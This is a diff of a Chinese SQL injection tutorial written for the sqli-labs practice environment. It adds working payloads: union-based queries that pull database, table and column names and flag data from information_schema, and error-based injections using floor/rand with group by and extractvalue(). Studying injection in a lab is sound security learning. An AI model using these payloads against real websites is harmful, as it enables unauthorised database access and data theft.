@@ -36,7 +36,7 @@ keywords:
 网址都是采用`url`编码，一般浏览器网址栏的字符都会被自动转码，但需要注意几点
 
 - **末尾的空格不会被转码**
-- **#不会被转码**（**#**url编码后是**%23**）
+- **#不会被转码**（**#** url 编码后是 **%23** ）
 
 ## 注释问题
 
@@ -60,7 +60,7 @@ where id=123
 
 找到注入点以后，如果该注入点会返回查询的的数据，就可以着手获取数据库的基本信息了
 
-如果没有返回数据，考虑双层（双查询）注入和盲注
+如果没有返回数据，考虑报错注入和盲注
 
 ### 判断查询字段数
 
@@ -83,38 +83,28 @@ MariaDB sqlilabs@(none):security> select *  from users where id=1 order by 4
 
 > 请注意这是查询的字段数，不一定等于表的字段数，后端逻辑可能是查询全部字段然后进行筛选
 
+### 获取数据库名 
+
+```sql
+?id=1 and 1=2 union select 1,database()
+```
+
 ### 获取数据库的表
 
 ```sql
-MariaDB root@(none):(none)> select table_name from information_schema.tables where table_schema='security'
-+------------+ 
-| table_name |
-+------------+
-| users      |
-| emails     |
-| uagents    |
-| referers   |
-+------------+
-4 rows in set
-Time: 0.005s
+?id=1 and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema='sqli'
 ```
 
 ### 获取表的字段
 
 ```sql
-MariaDB root@(none):(none)> 
-select column_name 
-from information_schema.columns 
-where table_schema = 'security' and table_name='users'
-+-------------+
-| column_name |
-+-------------+
-| id          |
-| username    |
-| password    |
-+-------------+
-3 rows in set
-Time: 0.009s
+?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'
+```
+
+### 获取该字段下的所有数据
+
+```sql
+?id=1 and 1=2 union select 1,group_concat(flag) from sqli.flag
 ```
 
 ### 绕过输出一行的逻辑
@@ -123,20 +113,35 @@ Time: 0.009s
 
 ![](https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/sql-injection2.png)
 
-## 双查询注入
+## 报错注入
 
 当后端sql运行正确时不会返回数据，而错误才会返回信息，这时就可以利用错误的信息将数据库的信息暴露出来
 
-双查询注入利用的是 `group by` 子句的原理，**配合count**（重复插入时报错），floor和rand(产生两个随机值相撞的概率大)使其报错．
+方法一：
 
-### 获取数据库名
+利用 `group by` 子句的原理，**配合count**，floor和rand(产生两个随机值相撞的概率大)使其报错．(group by虚拟表[count(\*), key]，rand重复计算插入后报错)
 
-![](https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/double-sql-injection.png)
+**获取数据库名**
+
+```sql
+?id=1 union select 1,count(*),concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a --+
+```
+
+缺点：数据库的记录必须>1才有几率报错。
+
+方法二：
+
+利用`extractvalue()`函数
+
+```sql
+?id=1 and extractvalue(1,concat(0x7e,database(),0x7e))--+
+```
+
+
 
 > **参考文章**
 >
 > [【技术分享】MySQL 注入攻击与防御](https://www.anquanke.com/post/id/85936)
 >
 > [Web安全学习笔记](https://websec.readthedocs.io/zh/latest/index.html)
->
-> [sql注入--双查询报错注入原理探索](https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html)
+
